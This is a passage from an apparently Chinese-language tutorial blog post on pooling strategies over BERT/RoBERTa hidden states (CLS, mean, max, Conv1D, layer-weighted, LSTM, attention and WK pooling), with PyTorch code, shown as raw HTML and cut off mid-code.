sentenceprediction (classification) objective的计算结果。</p><p>在config中可以设置 pooling layer 为 False，不输出这一结果。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">...<br>max_seq_length = <span class="hljs-number">256</span><br>_pretrained_model = <span class="hljs-string">'roberta-base'</span><br><br>config = AutoConfig.from_pretrained(_pretrained_model)<br>model = AutoModel.from_pretrained(_pretrained_model, config=config)<br>tokenizer = AutoTokenizer.from_pretrained(_pretrained_model)<br><br>clear_output()<br><br>features = tokenizer.batch_encode_plus(<br>    train_text,<br>    add_special_tokens=<span class="hljs-literal">True</span>,<br>    padding=<span class="hljs-string">'max_length'</span>,<br>    max_length=max_seq_length,<br>    truncation=<span class="hljs-literal">True</span>,<br>    return_tensors=<span class="hljs-string">'pt'</span>,<br>    return_attention_mask=<span class="hljs-literal">True</span><br>)<br><br>outputs = model(features[<span class="hljs-string">'input_ids'</span>], features[<span class="hljs-string">'attention_mask'</span>])<br><br>pooler_output = outputs[<span class="hljs-number">1</span>]<br><br>logits = nn.Linear(config.hidden_size, <span class="hljs-number">1</span>)(pooler_output) <span class="hljs-comment"># regression head</span><br>...<br></code></pre></div></td></tr></table></figure><h3><span id="more-than-last-hidden-state">More than last hidden state</span></h3><p>最后一层输出的 hidden state，[batch, maxlen,hidden_state]。其中[batch, 1, hidden_state]对应 [CLS]。</p><h4><span id="cls-embeddings">CLS Embeddings</span></h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">with</span> torch.no_grad():<br>    outputs = model(features[<span class="hljs-string">'input_ids'</span>], features[<span class="hljs-string">'attention_mask'</span>])<br>last_hidden_state = outputs[<span class="hljs-number">0</span>]<br><br>cls_embeddings = last_hidden_state[:, <span class="hljs-number">0</span>]<br></code></pre></div></td></tr></table></figure><p>可以处理简单的下游任务，将cls_embeddings作为整个序列的一个简单表示。</p><h4><span id="mean-pooling">Mean Pooling</span></h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">features = tokenizer.batch_encode_plus(<br>    train_text,<br>    add_special_tokens=<span class="hljs-literal">True</span>,<br>    padding=<span class="hljs-string">'max_length'</span>,<br>    max_length=max_seq_length,<br>    truncation=<span class="hljs-literal">True</span>,<br>    return_tensors=<span class="hljs-string">'pt'</span>,<br>    return_attention_mask=<span class="hljs-literal">True</span><br>)<br>attention_mask = features[<span class="hljs-string">'attention_mask'</span>]<br>...<br><br><span class="hljs-comment"># Step 1: Expand Attention Mask from [batch_size, max_len] to [batch_size, max_len, hidden_size].</span><br>input_mask_expanded = attention_mask.unsqueeze(<span class="hljs-number">-1</span>).expand(last_hidden_state.size()).float()<br><span class="hljs-comment"># Step 2: Sum Embeddings along max_len axis so now we have [batch_size, hidden_size]</span><br>sum_embeddings = torch.sum(last_hidden_state * input_mask_expanded, <span class="hljs-number">1</span>)<br><span class="hljs-comment"># Step 3: Sum Mask along max_len axis.</span><br>sum_mask = input_mask_expanded.sum(<span class="hljs-number">1</span>)<br>sum_mask = torch.clamp(sum_mask, min=<span class="hljs-number">1e-9</span>)<br><span class="hljs-comment"># Step 4: Take Average.</span><br>mean_embeddings = sum_embeddings / sum_mask<br><br>logits = nn.Linear(config.hidden_size, <span class="hljs-number">1</span>)(mean_embeddings) <span class="hljs-comment"># regression head</span><br></code></pre></div></td></tr></table></figure><p>在max len维度，进行平均。</p><h4><span id="max-pooling">Max Pooling</span></h4><p>在max len维度，进行max pooling</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># input_mask_expanded = attention_mask.unsqueeze(-1).expand(last_hidden_state.size()).float()</span><br><span class="hljs-comment"># last_hidden_state[input_mask_expanded == 0] = -1e9  # Set padding tokens to large negative value</span><br>max_embeddings = torch.max(last_hidden_state, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]<br></code></pre></div></td></tr></table></figure><h4><span id="mean-max-pooling-head">Mean-Max Pooling (Head)</span></h4><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Practical BERT_pic/image-20210720232953226.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">input_mask_expanded = attention_mask.unsqueeze(<span class="hljs-number">-1</span>).expand(last_hidden_state.size()).float()<br>sum_embeddings = torch.sum(last_hidden_state * input_mask_expanded, <span class="hljs-number">1</span>)<br>sum_mask = input_mask_expanded.sum(<span class="hljs-number">1</span>)<br>sum_mask = torch.clamp(sum_mask, min=<span class="hljs-number">1e-9</span>)<br>mean_embeddings = sum_embeddings / sum_mask<br><br>max_pooling_embeddings, _ = torch.max(last_hidden_state, <span class="hljs-number">1</span>)<br><br>cls_embeddings = last_hidden_state[:, <span class="hljs-number">0</span>]<br><br>mean_max_embeddings = torch.cat((mean_pooling_embeddings, max_pooling_embeddings, cls_embeddings), <span class="hljs-number">1</span>)<br>logits = nn.Linear(config.hidden_size * <span class="hljs-number">3</span>, <span class="hljs-number">1</span>)(mean_max_embeddings) <span class="hljs-comment"># 3 hidden size</span><br></code></pre></div></td></tr></table></figure><h4><span id="conv-1d-pooling">Conv-1D Pooling</span></h4><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Practical BERT_pic/image-20210720233904285.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># first define layers</span><br>cnn1 = nn.Conv1d(<span class="hljs-number">768</span>, <span class="hljs-number">256</span>, kernel_size=<span class="hljs-number">2</span>, padding=<span class="hljs-number">1</span>)<br>cnn2 = nn.Conv1d(<span class="hljs-number">256</span>, <span class="hljs-number">1</span>, kernel_size=<span class="hljs-number">2</span>, padding=<span class="hljs-number">1</span>)<br><br>last_hidden_state = last_hidden_state.permute(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>) <span class="hljs-comment"># (batch size, hidden size, seq len)</span><br>cnn_embeddings = F.relu(cnn1(last_hidden_state))<br>cnn_embeddings = cnn2(cnn_embeddings)<br>logits, _ = torch.max(cnn_embeddings, <span class="hljs-number">2</span>)  <span class="hljs-comment"># max pooling in Length dim</span><br></code></pre></div></td></tr></table></figure><h3><span id="more-than-hidden-statesoutput">More than Hidden StatesOutput</span></h3><p>embeddings 与 每一层的输出集合，(n_layers, batch_size,sequence_length, hidden_size)。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">...<br>max_seq_length = <span class="hljs-number">256</span><br>_pretrained_model = <span class="hljs-string">'roberta-base'</span><br><br>config = AutoConfig.from_pretrained(_pretrained_model)<br><span class="hljs-comment"># 设置输出选项</span><br>config.update(&#123;<span class="hljs-string">'output_hidden_states'</span>:<span class="hljs-literal">True</span>&#125;)<br><br>model = AutoModel.from_pretrained(_pretrained_model, config=config)<br>tokenizer = AutoTokenizer.from_pretrained(_pretrained_model)<br>clear_output()<br>features = tokenizer.batch_encode_plus(<br>    train_text,<br>    add_special_tokens=<span class="hljs-literal">True</span>,<br>    padding=<span class="hljs-string">'max_length'</span>,<br>    max_length=max_seq_length,<br>    truncation=<span class="hljs-literal">True</span>,<br>    return_tensors=<span class="hljs-string">'pt'</span>,<br>    return_attention_mask=<span class="hljs-literal">True</span><br>)<br><br><span class="hljs-keyword">with</span> torch.no_grad():<br>    outputs = model(features[<span class="hljs-string">'input_ids'</span>], features[<span class="hljs-string">'attention_mask'</span>])<br>all_hidden_states = torch.stack(outputs[<span class="hljs-number">2</span>])<br></code></pre></div></td></tr></table></figure><h4><span id="cls-layer-embeddings">CLS Layer Embeddings</span></h4><p>倒数第二层示例</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">layer_index = <span class="hljs-number">11</span> <span class="hljs-comment"># second to last hidden layer</span><br>cls_embeddings = all_hidden_states[layer_index, :, <span class="hljs-number">0</span>] <span class="hljs-comment"># 13 layers (embedding + num of blocks)</span><br><br>logits = nn.Linear(config.hidden_size, <span class="hljs-number">1</span>)(cls_embeddings) <span class="hljs-comment"># regression head</span><br></code></pre></div></td></tr></table></figure><p>GitHub的bert-as-service项目，就是默认取得倒数第二层的输出。更好地表示语义，而不被MLM任务和NSP任务影响太多。</p><h4><span id="concatenate-pooling">Concatenate Pooling</span></h4><p>最后四层 CLS concat.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">all_hidden_states = torch.stack(outputs[<span class="hljs-number">2</span>])<br><br>concatenate_pooling = torch.cat(<br>    (all_hidden_states[<span class="hljs-number">-1</span>], all_hidden_states[<span class="hljs-number">-2</span>], all_hidden_states[<span class="hljs-number">-3</span>], all_hidden_states[<span class="hljs-number">-4</span>]), <span class="hljs-number">-1</span><br>)<br>concatenate_pooling = concatenate_pooling[:, <span class="hljs-number">0</span>]  <span class="hljs-comment"># first token</span><br><br>logits = nn.Linear(config.hidden_size*<span class="hljs-number">4</span>, <span class="hljs-number">1</span>)(concatenate_pooling)<br></code></pre></div></td></tr></table></figure><h4><span id="weighted-layer-pooling">Weighted Layer Pooling</span></h4><p>基于一个intuition，fine-tuning时，最容易被训练的应该是middlelayer的表达，因为顶层是专门用于 language modeling pre-train任务的。所以只使用顶层的输出进行下游任务，会限制模型的效果。（没有实证，一个假设）</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WeightedLayerPooling</span><span class="hljs-params">(nn.Module)</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, num_hidden_layers, layer_start: int = <span class="hljs-number">4</span>, layer_weights = None)</span>:</span><br>        super(WeightedLayerPooling, self).__init__()<br>        self.layer_start = layer_start<br>        self.num_hidden_layers = num_hidden_layers<br>        self.layer_weights = layer_weights <span class="hljs-keyword">if</span> layer_weights <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> \<br>            <span class="hljs-keyword">else</span> nn.Parameter(<br>                torch.tensor([<span class="hljs-number">1</span>] * (num_hidden_layers+<span class="hljs-number">1</span> - layer_start), dtype=torch.float)<br>            )<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forward</span><span class="hljs-params">(self, all_hidden_states)</span>:</span><br>        all_layer_embedding = all_hidden_states[self.layer_start:, :, :, :]<br>        weight_factor = self.layer_weights.unsqueeze(<span class="hljs-number">-1</span>).unsqueeze(<span class="hljs-number">-1</span>).unsqueeze(<span class="hljs-number">-1</span>).expand(all_layer_embedding.size())<br>        weighted_average = (weight_factor*all_layer_embedding).sum(dim=<span class="hljs-number">0</span>) / self.layer_weights.sum()<br>        <span class="hljs-keyword">return</span> weighted_average<br>    <br><span class="hljs-comment"># 使用：最后四层的 CLS 表示，计算加权和</span><br>layer_start = <span class="hljs-number">9</span><br>pooler = WeightedLayerPooling(<br>    config.num_hidden_layers, <br>    layer_start=layer_start, layer_weights=<span class="hljs-literal">None</span><br>)<br>weighted_pooling_embeddings = pooler(all_hidden_states)<br>weighted_pooling_embeddings = weighted_pooling_embeddings[:, <span class="hljs-number">0</span>]<br>logits = nn.Linear(config.hidden_size, <span class="hljs-number">1</span>)(weighted_pooling_embeddings)<br></code></pre></div></td></tr></table></figure><h4><span id="lstmgru-pooling">LSTM/GRU Pooling</span></h4><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Practical BERT_pic/image-20210721001441041.png" srcset="/img/loading.gif" lazyload alt style="zoom:70%;"><span class="math display">\[o = h^L_{LSTM} =LSTM(h^i_{CLS}), i ∈ [1, L]\]</span> CLS token输入LSTM，得到最终表示</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LSTMPooling</span><span class="hljs-params">(nn.Module)</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, num_layers, hidden_size, hiddendim_lstm)</span>:</span><br>        super(LSTMPooling, self).__init__()<br>        self.num_hidden_layers = num_layers<br>        self.hidden_size = hidden_size<br>        self.hiddendim_lstm = hiddendim_lstm<br>        self.lstm = nn.LSTM(self.hidden_size, self.hiddendim_lstm, batch_first=<span class="hljs-literal">True</span>)<br>        self.dropout = nn.Dropout(<span class="hljs-number">0.1</span>)<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forward</span><span class="hljs-params">(self, all_hidden_states)</span>:</span><br>        <span class="hljs-comment">## forward</span><br>        hidden_states = torch.stack([all_hidden_states[layer_i][:, <span class="hljs-number">0</span>].squeeze()<br>                                     <span class="hljs-keyword">for</span> layer_i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, self.num_hidden_layers+<span class="hljs-number">1</span>)], dim=<span class="hljs-number">-1</span>)<br>        hidden_states = hidden_states.view(<span class="hljs-number">-1</span>, self.num_hidden_layers, self.hidden_size)<br>        out, _ = self.lstm(hidden_states, <span class="hljs-literal">None</span>)<br>        out = self.dropout(out[:, <span class="hljs-number">-1</span>, :])<br>        <span class="hljs-keyword">return</span> out<br><br>hiddendim_lstm = <span class="hljs-number">256</span><br>pooler = LSTMPooling(config.num_hidden_layers, config.hidden_size, hiddendim_lstm)<br>lstm_pooling_embeddings = pooler(all_hidden_states)<br>logits = nn.Linear(hiddendim_lstm, <span class="hljs-number">1</span>)(lstm_pooling_embeddings) <span class="hljs-comment"># regression head</span><br></code></pre></div></td></tr></table></figure><h4><span id="attention-pooling">Attention Pooling</span></h4><p>dot-product attention： <span class="math display">\[o = W^T_{h} softmax(qh^T_{CLS})h_{CLS}\]</span> <span class="math inline">\(W^T_{h}\)</span> 和 <span class="math inline">\(q\)</span>为可学习参数。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AttentionPooling</span><span class="hljs-params">(nn.Module)</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, num_layers, hidden_size, hiddendim_fc)</span>:</span><br>        super(AttentionPooling, self).__init__()<br>        self.num_hidden_layers = num_layers<br>        self.hidden_size = hidden_size<br>        self.hiddendim_fc = hiddendim_fc<br>        self.dropout = nn.Dropout(<span class="hljs-number">0.1</span>)<br><br>        q_t = np.random.normal(loc=<span class="hljs-number">0.0</span>, scale=<span class="hljs-number">0.1</span>, size=(<span class="hljs-number">1</span>, self.hidden_size))<br>        self.q = nn.Parameter(torch.from_numpy(q_t)).float()<br>        w_ht = np.random.normal(loc=<span class="hljs-number">0.0</span>, scale=<span class="hljs-number">0.1</span>, size=(self.hidden_size, self.hiddendim_fc))<br>        self.w_h = nn.Parameter(torch.from_numpy(w_ht)).float()<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forward</span><span class="hljs-params">(self, all_hidden_states)</span>:</span><br>        hidden_states = torch.stack([all_hidden_states[layer_i][:, <span class="hljs-number">0</span>].squeeze()<br>                                     <span class="hljs-keyword">for</span> layer_i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, self.num_hidden_layers+<span class="hljs-number">1</span>)], dim=<span class="hljs-number">-1</span>)<br>        hidden_states = hidden_states.view(<span class="hljs-number">-1</span>, self.num_hidden_layers, self.hidden_size)<br>        out = self.attention(hidden_states)<br>        out = self.dropout(out)<br>        <span class="hljs-keyword">return</span> out<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">attention</span><span class="hljs-params">(self, h)</span>:</span><br>        v = torch.matmul(self.q, h.transpose(<span class="hljs-number">-2</span>, <span class="hljs-number">-1</span>)).squeeze(<span class="hljs-number">1</span>)<br>        v = F.softmax(v, <span class="hljs-number">-1</span>)<br>        v_temp = torch.matmul(v.unsqueeze(<span class="hljs-number">1</span>), h).transpose(<span class="hljs-number">-2</span>, <span class="hljs-number">-1</span>)<br>        v = torch.matmul(self.w_h.transpose(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>), v_temp).squeeze(<span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">return</span> v<br><br>hiddendim_fc = <span class="hljs-number">128</span><br>pooler = AttentionPooling(config.num_hidden_layers, config.hidden_size, hiddendim_fc)<br>attention_pooling_embeddings = pooler(all_hidden_states)<br>logits = nn.Linear(hiddendim_fc, <span class="hljs-number">1</span>)(attention_pooling_embeddings) <span class="hljs-comment"># regression head</span><br></code></pre></div></td></tr></table></figure><h4><span id="wkpooling">WKPooling</span></h4><p>来自论文: SBERT-WK: A Sentence Embedding Method By DissectingBERT-based Word Models</p><p>通过计算 每一层每个token的 alignment and noveltyproperties，得到每个token的 unified wordrepresentation。然后根据计算得到每个token 的 word importance，加权求和得到一个 Sentence Embedding 表示。</p><p>计算中用到QR分解，然而pytorch在GPU上计算QR很慢，所以转到CPU上计算，但是这依然很慢（相比于其他在GPU上的操作）。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WKPooling</span><span class="hljs-params">(nn.Module)</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, layer_start: int = <span class="hljs-number">4</span>, context_window_size: int = <span class="hljs-number">2</span>)</span>:</span><br>        super(WKPooling, self).__init__()<br>        self.layer_start = layer_start<br>        self.context_window_size = context_window_size<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forward</span><span class="hljs-params">(self, all_hidden_states)</span>:</span><br>        ft_all_layers = all_hidden_states<br>        org_device = ft_all_layers.device<br>        all_layer_embedding = ft_all_layers.transpose(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<br>        all_layer_embedding = all_layer_embedding[:, self.layer_start:, :, :]  <span class="hljs-comment"># Start from 4th layers output</span><br><br>        <span class="hljs-comment"># torch.qr is slow on GPU (see https://github.com/pytorch/pytorch/issues/22573). So compute it on CPU until issue is fixed</span><br>        all_layer_embedding = all_layer_embedding.cpu()<br><br>        attention_mask = features[<span class="hljs-string">'attention_mask'</span>].cpu().numpy()<br>        unmask_num = np.array([sum(mask) <span class="hljs-keyword">for</span> mask <span class="hljs-keyword">in</span> attention_mask]) - <span class="hljs-number">1</span>  <span class="hljs-comment"># Not considering the last item</span><br>        embedding = []<br><br>        <span class="hljs-comment"># One sentence at a time</span><br>        <span class="hljs-keyword">for</span> sent_index <span class="hljs-keyword">in</span> range(len(unmask_num)):<br>            sentence_feature = all_layer_embedding[sent_index, :, :unmask_num[sent_index], :]<br>            one_sentence_embedding = []<br>            <span class="hljs-comment"># Process each token</span><br>            <span class="hljs-keyword">for</span> token_index <span class="hljs-keyword">in</span> range(sentence_feature.shape[<span class="hljs-number">1</span>]):<br>                token_feature = sentence_feature[:, token_index, :]<br>                <span class="hljs-comment"># 'Unified Word Representation'</span><br>                token_embedding = self.unify_token(token_feature)<br>                one_sentence_embedding.append(token_embedding)<br><br>            <span class="hljs-comment">##features.update(&#123;'sentence_embedding': features['cls_token_embeddings']&#125;)</span><br><br>            one_sentence_embedding = torch.stack(one_sentence_embedding)<br>            sentence_embedding = self.unify_sentence(sentence_feature, one_sentence_embedding)<br>            embedding.append(sentence_embedding)<br><br>        output_vector = torch.stack(embedding).to(org_device)<br>        <span class="hljs-keyword">return</span> output_vector<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">unify_token</span><span class="hljs-params">(self, token_feature)</span>:</span><br>        <span class="hljs-comment">## Unify Token Representation</span><br>        window_size = self.context_window_size<br><br>        alpha_alignment = torch.zeros(token_feature.size()[<span class="hljs-number">0</span>], device=token_feature.device)<br>        alpha_novelty = torch.zeros(token_feature.size()[<span class="hljs-number">0</span>], device=token_feature.device)<br><br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> range(token_feature.size()[<span class="hljs-number">0</span>]):<br>            left_window = token_feature[k - window_size:k, :]<br>            right_window = token_feature[k + <span class="hljs-number">1</span>:k + window_size + <span class="hljs-number">1</span>, :]<br>            window_matrix = torch.cat([left_window, right_window, token_feature[k, :][<span class="hljs-literal">None</span>, :]])<br>            Q, R = torch.qr(window_matrix.T)<br><br>            r = R[:, <span class="hljs-number">-1</span>]<br>            alpha_alignment[k] = torch.mean(self.norm_vector(R[:<span class="hljs-number">-1</span>, :<span class="hljs-number">-1</span>], dim=<span class="hljs-number">0</span>), dim=<span class="hljs-number">1</span>).matmul(R[:<span class="hljs-number">-1</span>, <span class="hljs-number">-1</span>]) / torch.norm(r[:<span class="hljs-number">-1</span>])<br>            alpha_alignment[k] = <span class="hljs-number">1</span> / (alpha_alignment[k] * window_matrix.size()[<span class="hljs-number">0</span>] * <span class="hljs-number">2</span>)<br>            alpha_novelty[k] = torch.abs(r[<span class="hljs-number">-1</span>]) / torch.norm(r)<br><br>        <span class="hljs-comment"># Sum Norm</span><br>        alpha_alignment = alpha_alignment / torch.sum(alpha_alignment)  <span class="hljs-comment"># Normalization Choice</span><br>        alpha_novelty = alpha_novelty / torch.sum(alpha_novelty)<br><br>        alpha = alpha_novelty + alpha_alignment<br>        alpha = alpha / torch.sum(alpha)  <span class="hljs-comment"># Normalize</span><br><br>        out_embedding = torch.mv(token_feature.t(), alpha)<br>        <span class="hljs-keyword">return</span> out_embedding<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">norm_vector</span><span class="hljs-params">(self, vec, p=<span class="hljs-number">2</span>, dim=<span class="hljs-number">0</span>)</span>:</span><br>        <span class="hljs-comment">## Implements the normalize() function from sklearn</span><br>        vec_norm = torch.norm(vec, p=p, dim=dim)<br>        <span class="hljs-keyword">return</span> vec.div(vec_norm.expand_as(vec))<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">unify_sentence</span><span class="hljs-params">(self, sentence_feature, one_sentence_embedding)</span>:</span><br>        <span class="hljs-comment">## Unify Sentence By Token Importance</span><br>        sent_len = one_sentence_embedding.size()[<span class="hljs-number">0</span>]<br><br>        var_token = torch.zeros(sent_len, device=one_sentence_embedding.device)<br>        <span class="hljs-keyword">for</span> token_index <span 